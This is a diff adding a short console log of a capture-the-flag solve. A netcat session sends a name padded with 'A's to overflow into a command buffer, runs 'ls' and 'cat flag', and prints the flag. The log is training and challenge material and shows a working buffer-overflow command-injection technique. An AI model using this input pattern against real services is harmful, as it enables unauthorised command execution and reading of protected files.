@@ -1,0 +1,28 @@
+C:\Users\Safflower>nc 198.13.62.9 1234
+what is your name ? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA11111111
+Hi! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA11111111! I'll execute a command for you!
+
+===================================
+===================================
+[ A11111111 ] executed! Bye!
+
+C:\Users\Safflower>nc 198.13.62.9 1234
+what is your name ? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls
+Hi! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls! I'll execute a command for you!
+
+===================================
+a
+a.c
+flag
+run.sh
+===================================
+[ ls ] executed! Bye!
+
+C:\Users\Safflower>nc 198.13.62.9 1234
+what is your name ? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag
+Hi! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag! I'll execute a command for you!
+
+===================================
+FLAG{9reat_thats_pwnable}
+===================================
+[ cat flag ] executed! Bye!
